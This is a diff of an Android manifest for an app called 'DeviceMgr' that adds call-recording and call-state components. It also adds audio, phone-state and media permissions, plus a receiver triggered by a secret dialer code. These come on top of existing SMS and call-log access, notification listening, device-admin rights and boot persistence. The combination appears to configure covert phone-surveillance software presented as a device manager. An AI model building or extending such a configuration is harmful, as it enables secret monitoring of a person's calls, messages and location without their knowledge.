@@ -1,58 +1,105 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest package="com.company.devicemgr"
-xmlns:android="http://schemas.android.com/apk/res/android">
+    xmlns:android="http://schemas.android.com/apk/res/android">
 
-<!-- Internet + foreground + storage + location + phone + sms -->
-<uses-permission android:name="android.permission.INTERNET"/>
-<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
-<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
-<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
-<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
-<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
-<uses-permission android:name="android.permission.READ_CALL_LOG"/>
-<uses-permission android:name="android.permission.READ_SMS"/>
-<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
-<!-- Notification listener is a service declared with permission -->
+    <uses-permission android:name="android.permission.INTERNET" />
 
-<application
-android:allowBackup="true"
-android:label="DeviceMgr"
-android:supportsRtl="true"
-android:theme="@style/Theme.MyApplication">
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
 
-<activity android:name="com.company.devicemgr.activities.LoginActivity">
-<intent-filter>
-<action android:name="android.intent.action.MAIN"/>
-<category android:name="android.intent.category.LAUNCHER"/>
-</intent-filter>
-</activity>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-<activity android:name="com.company.devicemgr.activities.MainPermissionsActivity" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
 
-<service android:name="com.company.devicemgr.services.ForegroundTelemetryService"
-android:foregroundServiceType="location"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
-<service android:name="com.company.devicemgr.services.NotificationListenerSvc"
-android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-<intent-filter>
-<action android:name="android.service.notification.NotificationListenerService" />
-</intent-filter>
-</service>
+    <application
+        android:allowBackup="true"
+        android:label="DeviceMgr"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.MyApplication">
 
-<receiver android:name="com.company.devicemgr.receivers.DeviceAdminReceiver"
-android:permission="android.permission.BIND_DEVICE_ADMIN">
-<meta-data android:name="android.app.device_admin"
-android:resource="@xml/device_admin_receiver"/>
-<intent-filter>
-<action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
-</intent-filter>
-</receiver>
+        <activity
+            android:name="com.company.devicemgr.activities.LoginActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
 
-<receiver android:name="com.company.devicemgr.receivers.BootReceiver">
-<intent-filter>
-<action android:name="android.intent.action.BOOT_COMPLETED"/>
-</intent-filter>
-</receiver>
+        <activity
+            android:name="com.company.devicemgr.activities.MainPermissionsActivity"
+            android:exported="false" />
 
-</application>
+        <service
+            android:name="com.company.devicemgr.services.ForegroundTelemetryService"
+            android:exported="false"
+            android:foregroundServiceType="location" />
+
+        <service
+            android:name="com.company.devicemgr.services.CallRecordingService"
+            android:exported="false" />
+
+        <service
+            android:name="com.company.devicemgr.services.NotificationListenerSvc"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <receiver
+            android:name="com.company.devicemgr.receivers.DeviceAdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_receiver" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.company.devicemgr.receivers.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.company.devicemgr.receivers.CallStateReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.company.devicemgr.receivers.SecretCodeReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="8466" />
+            </intent-filter>
+        </receiver>
+
+    </application>
 </manifest>
